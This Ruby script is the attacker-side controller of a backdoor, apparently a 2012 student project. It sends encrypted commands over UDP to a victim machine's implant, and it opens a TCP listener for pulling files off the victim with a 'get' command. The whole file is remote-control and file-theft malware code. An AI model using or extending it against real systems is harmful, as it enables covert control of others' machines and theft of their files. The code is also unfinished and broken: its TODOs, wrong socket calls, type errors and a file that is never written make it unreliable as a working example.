#!/usr/bin/env ruby

# Ruby Libraries to load
require "socket"
require "./lib_trollop.rb"
require "./dispatch.rb"

# Command line argument parsing
opts = Trollop::options do
	version "Backdoor Attacker V1.0 (c) 2012 Karl Castillo, James Brennan"
	banner <<-EOS
This is the attacker side of the Backdoor Terminal.

Usage:
	attacker [options]

where [options] are:		
	EOS
	
	opt :host, "Victim IP", :short => "-H", :type => :string, :default => "127.0.0.1" # string --host <s>, default 127.0.0.1
	opt :cport, "Victim Command Port", :short => "-c", :default => 8000 # integer --cport <i>, default 8000
	opt :fport, "Victim File Transfer Port", :short => "f", :default => 8001 # integer --fport <i>, default 8001
end

# Make sure that we are running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

# Create UDP Socket for Commands
udp = UDPSocket.new
dis = Dispatch.new

udp.connect(opts[:host], opts[:cport])

while 1 do
	print "> "
	cmd = gets.chomp
	# split up command
	cmds = cmd.split(' ')
	
	if cmds[0] == "quit" or cmd[0] == "q" then # Quit terminal
		abort("Quitting...")
	elsif cmds[0] == "help" or cmds[0] == "h" then # Show commands
		print "\nCommands:\n\n"
		print "\tquit/q: Quit the application\n"
		print "\thelp/h: Show list of commonly used commands\n"
		print "\tget [filename] <port>: Gets a specified file from the victim\n"
		print "\tls [directory]: Gets a listing of the files and directorie of a specific directory\n"
	elsif cmds[0] == "get" then # Get file
		data = dis.encrypt(cmd)
		udp.send(data, 0, opts[:host], opts[:cport])
		
		# Create TCP Connection for file Transfer
		tcp = TCPServer.new cmds[2]
		
		# Wait for victim to connect
		print "Waiting for victim to connect...\n"
		victim = tcp.accept
		print "Client connected...\n"
		name = cmds[1]
	
		# Open File for writing
		file = File.open(name, "wb")
		print("Receiving File: " + name)

		print "Transferring data...\n"
		# TODO:
		# 	Run until victim disconnects
		# 	Write to file upon receving
		data = ''
		while (tmp = tcp.receive(255))
			if(tmp < 255)
				break
			end

			data += data + tmp
		end 		

		# Close connection
		tcp.close
		print "Data transfer complete!\n"
	else # Normal commands
		data = dis.encrypt(cmd)
		udp.send(data, 0, opts[:host], opts[:fport])
		
		#TODO:
		#	Fix receiving end
		udp.recvfrom(9999)
	end
end
